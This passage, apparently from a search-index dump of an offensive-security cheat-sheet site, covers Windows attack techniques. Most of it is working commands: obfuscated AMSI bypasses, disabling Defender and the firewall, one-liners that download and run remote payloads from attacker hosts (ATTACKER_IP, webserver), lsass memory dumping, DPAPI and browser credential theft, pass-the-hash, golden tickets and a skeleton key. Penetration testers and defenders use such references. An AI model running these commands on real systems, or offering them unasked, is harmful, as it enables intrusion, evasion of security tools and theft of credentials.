Console.WriteLine(\"Patch Sucessfull\");\n        }\n        catch (Exception e)\n        {\n            Console.WriteLine(\" [x] {0}\", e.Message);\n            Console.WriteLine(\" [x] {0}\", e.InnerException);\n        }\n    }\n    private static bool is64Bit()\n        {\n            bool is64Bit = true;\n            if (IntPtr.Size == 4)\n                is64Bit = false;\n            return is64Bit;\n        }\n}\nclass Win32\n{\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string name);\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\nAdd-Type -TypeDefinition $Winpatch -Language CSharp\n[patch]::it()\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#other-interesting-amsi-bypass","title":"Other interesting AMSI bypass","text":"<ul> <li>tihanyin/PSSW100AVB/AMSI_bypass_2021_09.ps1 <pre><code>$A=\"5492868772801748688168747280728187173688878280688776828\"\n$B=\"1173680867656877679866880867644817687416876797271\"\n[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace \" \" ).GetField([string](38..51|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace \" \",'Non' + 'Public,Static').SetValue($null,$true)\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#amsifail","title":"AMSI.fail","text":"<p>AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before being obfuscated. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures. - https://amsi.fail/</p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#references","title":"References","text":"<ul> <li>S3cur3Th1sSh1t - Amsi-Bypass-Powershell</li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20DPAPI/","title":"Windows - DPAPI","text":"<p>On Windows, credentials saved in the Windows Credentials Manager are encrypted using Microsoft's Data Protection API and stored as \"blob\" files in user AppData folder.</p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20DPAPI/#summary","title":"Summary","text":"<ul> <li>Data Protection API<ul> <li>List Credential Files</li> <li>Mimikatz - Credential Manager &amp; DPAPI</li> <li>Hekatomb - Steal all credentials on domain</li> <li>DonPAPI - Dumping DPAPI credz remotely</li> </ul> </li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20DPAPI/#data-protection-api","title":"Data Protection API","text":"<ul> <li>Outside of a domain: the user's <code>password hash</code> is used to encrypt these \"blobs\".</li> <li>Inside a domain: the <code>domain controller's master key</code> is used to encrypt these blobs.</li> </ul> <p>With the extracted private key of the domain controller, it is possible to decrypt all the blobs, and therefore to recover all the secrets recorded in the Windows identification manager of all the work stations in the domain.</p> <pre><code>vaultcmd /list\nVaultCmd /listcreds:&lt;namevault&gt;|&lt;guidvault&gt; /all\nvaultcmd /listcreds:\"Windows Credentials\" /all\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20DPAPI/#list-credential-files","title":"List Credential Files","text":"<pre><code>dir /a:h C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\\ndir /a:h C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\\nGet-ChildItem -Hidden C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\\nGet-ChildItem -Hidden C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20DPAPI/#mimikatz-credential-manager-dpapi","title":"Mimikatz - Credential Manager &amp; DPAPI","text":"<pre><code># check the folder to find credentials\ndir C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Credentials\\*\n# check the file with mimikatz\nmimikatz dpapi::cred /in:C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0\n# find master key\nmimikatz !sekurlsa::dpapi\n# use master key\nmimikatz dpapi::cred /in:C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b\n# find and export backup keys\nlsadump::backupkeys /system:dc01.lab.local /export\n# use backup keys\ndpapi::masterkey /in:\"C:\\Users\\&lt;USERNAME&gt;\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2552734371-813931464-1050690807-1106\\3e90dd9e-f901-40a1-b691-84d7f647b8fe\" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20DPAPI/#hekatomb-steal-all-credentials-on-domain","title":"Hekatomb - Steal all credentials on domain","text":"<p>Processus-Thief/Hekatomb is a python script that connects to LDAP directory to retrieve all computers and users informations. Then it will download all DPAPI blob of all users from all computers. Finally, it will extract domain controller private key through RPC uses it to decrypt all credentials.</p> <pre><code>pip3 install hekatomb\nhekatomb -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp\n</code></pre> <p></p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20DPAPI/#donpapi-dumping-dpapi-credz-remotely","title":"DonPAPI - Dumping DPAPI credz remotely","text":"<ul> <li>login-securite/DonPAPI</li> </ul> <pre><code>DonPAPI.py domain/user:passw0rd@target\nDonPAPI.py --hashes &lt;LM&gt;:&lt;NT&gt; domain/user@target\n# using domain backup key\ndpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip\npython DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20DPAPI/#references","title":"References","text":"<ul> <li>DPAPI - Extracting Passwords - HackTricks</li> <li>DON PAPI, OU L\u2019ART D\u2019ALLER PLUS LOIN QUE LE DOMAIN ADMIN - LoginSecurit\u00e9 - CORTO GUEGUEN - 4 MARS 2022</li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Defenses/","title":"Windows - Defenses","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Defenses/#summary","title":"Summary","text":"<ul> <li>AppLocker</li> <li>DPAPI</li> <li>Powershell<ul> <li>Anti Malware Scan Interface</li> <li>Just Enough Administration</li> <li>Contrained Language Mode</li> <li>Script Block Logging</li> </ul> </li> <li>Windows Defender Antivirus</li> <li>Windows Defender Application Control</li> <li>Windows Defender Firewall</li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Defenses/#applocker","title":"AppLocker","text":"<p>AppLocker is a security feature in Microsoft Windows that provides administrators with the ability to control which applications and files users are allowed to run on their systems. The rules can be based on various criteria, such as the file path, file publisher, or file hash, and can be applied to specific users or groups.</p> <ul> <li> <p>Enumerate Local AppLocker Effective Policy     <pre><code>PowerView PS C:\\&gt; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\nPowerView PS C:\\&gt; Get-AppLockerPolicy -effective -xml\nGet-ChildItem -Path HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2\\Exe # (Keys: Appx, Dll, Exe, Msi and Script\n</code></pre></p> </li> <li> <p>AppLocker Bypass</p> <ul> <li>By default, <code>C:\\Windows</code> is not blocked, and <code>C:\\Windows\\Tasks</code> is writtable by any users</li> <li>api0cradle/UltimateAppLockerByPassList/Generic-AppLockerbypasses.md</li> <li>api0cradle/UltimateAppLockerByPassList/VerifiedAppLockerBypasses.md</li> <li>api0cradle/UltimateAppLockerByPassList/DLL-Execution.md</li> </ul> </li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Defenses/#dpapi","title":"DPAPI","text":"<p>Refer to PayloadsAllTheThings/Windows - DPAPI.md</p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Defenses/#powershell","title":"Powershell","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Defenses/#anti-malware-scan-interface","title":"Anti Malware Scan Interface","text":"<p>The Anti-Malware Scan Interface (AMSI) is a Windows API (Application Programming Interface) that provides a unified interface for applications and services to integrate with any anti-malware product installed on a system. The API allows anti-malware solutions to scan files and scripts at runtime, and provides a means for applications to request a scan of specific content.</p> <p>Find more AMSI bypass: Windows - AMSI Bypass.md</p> <pre><code>PS C:\\&gt; [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Defenses/#just-enough-administration","title":"Just Enough Administration","text":"<p>Just-Enough-Administration (JEA) is a feature in Microsoft Windows Server that allows administrators to delegate specific administrative tasks to non-administrative users. JEA provides a secure and controlled way to grant limited, just-enough access to systems, while ensuring that the user cannot perform unintended actions or access sensitive information.</p> <p>Breaking out if JEA: * List available cmdlets: <code>command</code> * Look for non-default cmdlets:     <pre><code>Set-PSSessionConfiguration\nStart-Process\nNew-Service\nAdd-Computer\n</code></pre></p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Defenses/#constrained-language-mode","title":"Constrained Language Mode","text":"<p>Check if we are in a constrained mode: <code>$ExecutionContext.SessionState.LanguageMode</code></p> <ul> <li> <p>Bypass using an old Powershell. Powershell v2 doesn't support CLM.     <pre><code>powershell.exe -version 2\npowershell.exe -version 2 -ExecutionPolicy bypass\npowershell.exe -v 2 -ep bypass -command \"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')\"\n</code></pre></p> </li> <li> <p>Bypass when <code>__PSLockDownPolicy</code> is used. Just put \"System32\" somewhere in the path.      <pre><code># Enable CLM from the environment\n[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')\nGet-ChildItem -Path Env:\n# Create a check-mode.ps1 containing your \"evil\" powershell commands\n$mode = $ExecutionContext.SessionState.LanguageMode\nwrite-host $mode\n# Simple bypass, execute inside a System32 folder\nPS C:\\&gt; C:\\Users\\Public\\check-mode.ps1\nConstrainedLanguage\nPS C:\\&gt; C:\\Users\\Public\\System32\\check-mode.ps1\nFullLanguagge\n</code></pre></p> </li> <li> <p>Bypass using COM: xpn/COM_to_registry.ps1</p> </li> <li>Bypass using your own Powershell DLL: p3nt4/PowerShdll &amp; iomoath/PowerShx <pre><code>rundll32 PowerShdll,main &lt;script&gt;\nrundll32 PowerShdll,main -h      Display this message\nrundll32 PowerShdll,main -f &lt;path&gt;       Run the script passed as argument\nrundll32 PowerShdll,main -w      Start an interactive console in a new window (Default)\nrundll32 PowerShdll,main -i      Start an interactive console in this console\nrundll32 PowerShx.dll,main -e                           &lt;PS script to run&gt;\nrundll32 PowerShx.dll,main -f &lt;path&gt;                    Run the script passed as argument\nrundll32 PowerShx.dll,main -f &lt;path&gt; -c &lt;PS Cmdlet&gt;     Load a script and run a PS cmdlet\nrundll32 PowerShx.dll,main -w                           Start an interactive console in a new window\nrundll32 PowerShx.dll,main -i                           Start an interactive console\nrundll32 PowerShx.dll,main -s                           Attempt to bypass AMSI\nrundll32 PowerShx.dll,main -v                           Print Execution Output to the console\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Defenses/#script-block-logging","title":"Script Block Logging","text":"<p>Once Script Block Logging is enabled, the script blocks and commands that are executed will be recorded in the Windows event log under the \"Windows PowerShell\" channel. To view the logs, administrators can use the Event Viewer application and navigate to the \"Windows PowerShell\" channel.</p> <p>Enable Script Block Loggin:</p> <pre><code>function Enable-PSScriptBlockLogging\n{\n$basePath = 'HKLM:\\Software\\Policies\\Microsoft\\Windows' +\n'\\PowerShell\\ScriptBlockLogging'\nif(-not (Test-Path $basePath))\n{\n$null = New-Item $basePath -Force\n}\nSet-ItemProperty $basePath -Name EnableScriptBlockLogging -Value \"1\"\n}\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Defenses/#windows-defender-antivirus","title":"Windows Defender Antivirus","text":"<p>Also known as <code>Microsoft Defender</code>.</p> <pre><code># check status of Defender\nPS C:\\&gt; Get-MpComputerStatus\n# disable scanning all downloaded files and attachments, disable AMSI (reactive)\nPS C:\\&gt; Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus\nPS C:\\&gt; Set-MpPreference -DisableIOAVProtection $true\n# disable AMSI (set to 0 to enable)\nPS C:\\&gt; Set-MpPreference -DisableScriptScanning 1 \n# exclude a folder\nPS C:\\&gt; Add-MpPreference -ExclusionPath \"C:\\Temp\"\nPS C:\\&gt; Add-MpPreference -ExclusionPath \"C:\\Windows\\Tasks\"\nPS C:\\&gt; Set-MpPreference -ExclusionProcess \"word.exe\", \"vmwp.exe\"\n# remove signatures (if Internet connection is present, they will be downloaded again):\nPS &gt; &amp; \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" -RemoveDefinitions -All\nPS &gt; &amp; \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Defenses/#windows-defender-application-control","title":"Windows Defender Application Control","text":"<p>Also known as <code>WDAC/UMCI/Device Guard</code>.</p> <p>Windows Defender Application Guard, formerly known as Device Guard has the power to control if an application may or may not be executed on a Windows device. WDAC will prevent the execution, running, and loading of unwanted or malicious code, drivers, and scripts. WDAC does not trust any software it does not know of.</p> <ul> <li> <p>Get WDAC current mode     <pre><code>$ Get-ComputerInfo\nDeviceGuardCodeIntegrityPolicyEnforcementStatus         : EnforcementMode\nDeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus : EnforcementMode\n</code></pre></p> </li> <li> <p>Device Guard policy location: <code>C:\\Windows\\System32\\CodeIntegrity\\CiPolicies\\Active\\{PolicyId GUID}.cip</code></p> </li> <li>Device Guard example policies: <code>C:\\Windows\\System32\\CodeIntegrity\\ExamplePolicies\\</code></li> <li>WDAC bypass techniques: bohops/UltimateWDACBypassList</li> <li>WDAC utilities: mattifestation/WDACTools, a PowerShell module to facilitate building, configuring, deploying, and auditing Windows Defender Application Control (WDAC) policies</li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Defenses/#windows-defender-firewall","title":"Windows Defender Firewall","text":"<ul> <li> <p>List firewall state and current configuration     <pre><code>netsh advfirewall firewall dump\n# or \nnetsh firewall show state\nnetsh firewall show config\n</code></pre></p> </li> <li> <p>List firewall's blocked ports     <pre><code>$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq \"0\"} | select name,applicationname,localports\n</code></pre></p> </li> <li> <p>Disable firewall     <pre><code># Disable Firewall via cmd\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"  /v fDenyTSConnections /t REG_DWORD /d 0 /f\n# Disable Firewall via Powershell\npowershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\" -Name \"fDenyTSConnections\" \u2013Value'`\n# Disable Firewall on any windows using native command\nnetsh firewall set opmode disable\nnetsh Advfirewall set allprofiles state off\n</code></pre></p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Defenses/#references","title":"References","text":"<ul> <li>SNEAKING PAST DEVICE GUARD - Cybereason - Philip Tsukerman</li> <li>PowerShell about_Logging_Windows - Microsoft Documentation</li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/","title":"Windows - Download and execute methods","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#downloaded-files-location","title":"Downloaded files location","text":"<ul> <li>C:\\Users\\\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\ <li>C:\\Users\\\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\ <li>C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Temp\\TfsStore\\Tfs_DAV</li>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#powershell","title":"Powershell","text":"<p>From an HTTP server</p> <pre><code>powershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex\"\n# Download only\n(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/PowerUp.ps1\", \"C:\\Windows\\Temp\\PowerUp.ps1\")\nInvoke-WebRequest \"http://10.10.10.10/binary.exe\" -OutFile \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\binary.exe\"\n# Download and run Rubeus, with arguments\n$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/Rubeus.exe')\n$assem = [System.Reflection.Assembly]::Load($data)\n[Rubeus.Program]::Main(\"s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt\".Split())\n# Execute a specific method from an assembly \n$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/lib.dll')\n$assem = [System.Reflection.Assembly]::Load($data)\n$class = $assem.GetType(\"ClassLibrary1.Class1\")\n$method = $class.GetMethod(\"runner\")\n$method.Invoke(0, $null)\n</code></pre> <p>From a Webdav server</p> <pre><code>powershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#cmd","title":"Cmd","text":"<pre><code>cmd.exe /k &lt; \\\\webdavserver\\folder\\batchfile.txt\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#cscript-wscript","title":"Cscript / Wscript","text":"<pre><code>cscript //E:jscript \\\\webdavserver\\folder\\payload.txt\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#mshta","title":"Mshta","text":"<pre><code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:http://webserver/payload.sct\"\")\"))\n</code></pre> <pre><code>mshta http://webserver/payload.hta\n</code></pre> <pre><code>mshta \\\\webdavserver\\folder\\payload.hta\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#rundll32","title":"Rundll32","text":"<pre><code>rundll32 \\\\webdavserver\\folder\\payload.dll,entrypoint\n</code></pre> <pre><code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";o=GetObject(\"script:http://webserver/payload.sct\");window.close();\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#regasm-regsvc-subtee","title":"Regasm / Regsvc @subTee","text":"<pre><code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /u \\\\webdavserver\\folder\\payload.dll\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#regsvr32-subtee","title":"Regsvr32 @subTee","text":"<pre><code>regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll\n</code></pre> <pre><code>regsvr32 /u /n /s /i:\\\\webdavserver\\folder\\payload.sct scrobj.dll\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#odbcconf","title":"Odbcconf","text":"<pre><code>odbcconf /s /a {regsvr \\\\webdavserver\\folder\\payload_dll.txt}\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#msbuild","title":"Msbuild","text":"<pre><code>cmd /V /c \"set MB=\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe\" &amp; !MB! /noautoresponse /preprocess \\\\webdavserver\\folder\\payload.xml &gt; payload.xml &amp; !MB! payload.xml\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#certutil","title":"Certutil","text":"<pre><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.dll &amp; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil /logfile= /LogToConsole=false /u payload.dll\n</code></pre> <pre><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#bitsadmin","title":"Bitsadmin","text":"<pre><code>bitsadmin /transfer mydownloadjob /download /priority normal http://&lt;attackerIP&gt;/xyz.exe C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\local\\\\temp\\\\xyz.exe\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/#references","title":"References","text":"<ul> <li>arno0x0x - Windows oneliners to download remote payload and execute arbitrary code</li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/","title":"Windows - Mimikatz","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#summary","title":"Summary","text":"<ul> <li>Execute commands</li> <li>Extract passwords</li> <li>LSA Protection Workaround</li> <li>Mini Dump</li> <li>Pass The Hash</li> <li>Golden ticket</li> <li>Skeleton key</li> <li>RDP Session Takeover</li> <li>RDP Passwords</li> <li>Credential Manager &amp; DPAPI</li> <li>Chrome Cookies &amp; Credential</li> <li>Task Scheduled credentials</li> <li>Vault</li> <li>Commands list</li> <li>Powershell version</li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#execute-commands","title":"Execute commands","text":"<p>Only one command</p> <pre><code>PS C:\\temp\\mimikatz&gt; .\\mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" exit\n</code></pre> <p>Mimikatz console (multiple commands)</p> <pre><code>PS C:\\temp\\mimikatz&gt; .\\mimikatz\nmimikatz # privilege::debug\nmimikatz # log\nmimikatz # sekurlsa::logonpasswords\nmimikatz # sekurlsa::wdigest\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#extract-passwords","title":"Extract passwords","text":"<p>Microsoft disabled lsass clear text storage since Win8.1 / 2012R2+. It was backported (KB2871997) as a reg key on Win7 / 8 / 2008R2 / 2012 but clear text is still enabled.</p> <pre><code>mimikatz_command -f sekurlsa::logonPasswords full\nmimikatz_command -f sekurlsa::wdigest\n# to re-enable wdigest in Windows Server 2012+\n# in HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest \n# create a DWORD 'UseLogonCredential' with the value 1.\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1\n</code></pre> <p> To take effect, conditions are required : - Win7 / 2008R2 / 8 / 2012 / 8.1 / 2012R2:   * Adding requires lock   * Removing requires signout - Win10:   * Adding requires signout   * Removing requires signout - Win2016:   * Adding requires lock   * Removing requires reboot</p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#lsa-protection-workaround","title":"LSA Protection Workaround","text":"<ul> <li> <p>LSA as a Protected Process (RunAsPPL)   <pre><code># Check if LSA runs as a protected process by looking if the variable \"RunAsPPL\" is set to 0x1\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\n# Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe\n# Now lets import the mimidriver.sys to the system\nmimikatz # !+\n# Now lets remove the protection flags from lsass.exe process\nmimikatz # !processprotect /process:lsass.exe /remove\n# Finally run the logonpasswords function to dump lsass\nmimikatz # privilege::debug    \nmimikatz # token::elevate\nmimikatz # sekurlsa::logonpasswords\n# Now lets re-add the protection flags to the lsass.exe process\nmimikatz # !processprotect /process:lsass.exe\n# Unload the service created\nmimikatz # !-\n# https://github.com/itm4n/PPLdump\nPPLdump.exe [-v] [-d] [-f] &lt;PROC_NAME|PROC_ID&gt; &lt;DUMP_FILE&gt;\nPPLdump.exe lsass.exe lsass.dmp\nPPLdump.exe -v 720 out.dmp\n</code></pre></p> </li> <li> <p>LSA is running as virtualized process (LSAISO) by Credential Guard <pre><code># Check if a process called lsaiso.exe exists on the running processes\ntasklist |findstr lsaiso\n# Lets inject our own malicious Security Support Provider into memory\n# require mimilib.dll in the same folder\nmimikatz # misc::memssp\n# Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\\windows\\system32\\mimilsa.log\n</code></pre></p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#mini-dump","title":"Mini Dump","text":"<p>Dump the lsass process with <code>procdump</code></p> <p>Windows Defender is triggered when a memory dump of lsass is operated, quickly leading to the deletion of the dump. Using lsass's process identifier (pid) \"bypasses\" that.</p> <pre><code># HTTP method - using the default way\ncertutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\\Users\\Public\\procdump.exe\nC:\\Users\\Public\\procdump.exe -accepteula -ma lsass.exe lsass.dmp\n# SMB method - using the pid\nnet use Z: https://live.sysinternals.com\ntasklist /fi \"imagename eq lsass.exe\" # Find lsass's pid\nZ:\\procdump.exe -accepteula -ma $lsass_pid lsass.dmp\n</code></pre> <p>Dump the lsass process with <code>rundll32</code></p> <pre><code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsass_pid C:\\temp\\lsass.dmp full\n</code></pre> <p>Use the minidump: * Mimikatz: <code>.\\mimikatz.exe \"sekurlsa::minidump lsass.dmp\"</code> <pre><code>mimikatz # sekurlsa::minidump lsass.dmp\nmimikatz # sekurlsa::logonPasswords\n</code></pre> * Pypykatz: <code>pypykatz lsa minidump lsass.dmp</code></p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#pass-the-hash","title":"Pass The Hash","text":"<pre><code>mimikatz # sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#golden-ticket","title":"Golden ticket","text":"<pre><code>.\\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt\n</code></pre> <pre><code>.\\mimikatz \"kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt\" exit\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#skeleton-key","title":"Skeleton key","text":"<pre><code>privilege::debug\nmisc::skeleton\n# map the share\nnet use p: \\\\WIN-PTELU2U07KG\\admin$ /user:john mimikatz\n# login as someone\nrdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#rdp-session-takeover","title":"RDP Session Takeover","text":"<p>Use <code>ts::multirdp</code> to patch the RDP service to allow more than two users.</p> <ul> <li>Enable privileges   <pre><code>privilege::debug \ntoken::elevate \n</code></pre></li> <li>List RDP sessions   <pre><code>ts::sessions\n</code></pre></li> <li>Hijack session   <pre><code>ts::remote /id:2 \n</code></pre></li> </ul> <p>Run <code>tscon.exe</code> as the SYSTEM user, you can connect to any session without a password.</p> <pre><code># get the Session ID you want to hijack\nquery user\ncreate sesshijack binpath= \"cmd.exe /k tscon 1 /dest:rdp-tcp#55\"\nnet start sesshijack\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#rdp-passwords","title":"RDP Passwords","text":"<p>Verify if the service is running: </p> <pre><code>sc queryex termservice\ntasklist /M:rdpcorets.dll\nnetstat -nob | Select-String TermService -Context 1\n</code></pre> <ul> <li>Extract passwords manually   <pre><code>procdump64.exe -ma 988 -accepteula C:\\svchost.dmp\nstrings -el svchost* | grep Password123 -C3\n</code></pre></li> <li>Extract passwords using Mimikatz   <pre><code>privilege::debug\nts::logonpasswords\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#credential-manager-dpapi","title":"Credential Manager &amp; DPAPI","text":"<pre><code># check the folder to find credentials\ndir C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Credentials\\*\n# check the file with mimikatz\n$ mimikatz dpapi::cred /in:C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0\n# find master key\n$ mimikatz !sekurlsa::dpapi\n# use master key\n$ mimikatz dpapi::cred /in:C:\\Users\\&lt;username&gt;\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#chrome-cookies-credential","title":"Chrome Cookies &amp; Credential","text":"<pre><code># Saved Cookies\ndpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies\" /unprotect\ndpapi::chrome /in:\"C:\\Users\\kbell\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies\" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b\n# Saved 